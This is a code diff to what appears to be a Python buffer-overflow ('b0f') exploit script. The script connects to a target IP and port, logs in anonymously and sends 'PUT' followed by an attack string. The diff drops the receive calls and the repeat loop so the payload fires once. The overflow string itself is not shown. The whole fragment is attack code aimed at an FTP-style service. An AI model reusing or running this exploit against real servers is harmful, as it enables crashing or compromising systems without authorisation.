@@ -16,9 +16,7 @@ def execute(ip, port):
         s.send(b'USER anonymous\r\n')
         s.recv(1024)
         s.send(b'PASS anonymous\r\n')
-        s.recv(1024)
         s.send(b'PUT' + bytes(string, "utf-8"))
-        s.recv(1024)
         s.close()
 
 
@@ -40,9 +38,7 @@ def main():
         exit(0)
     else:
         print("[+] Running b0f against:", target_ip, target_port)
-        while True:
-            #cmd = input('Provide a command # ')
-            execute(target_ip, target_port) #, cmd)
+        execute(target_ip, target_port)
         
 if __name__ == '__main__':
     main()
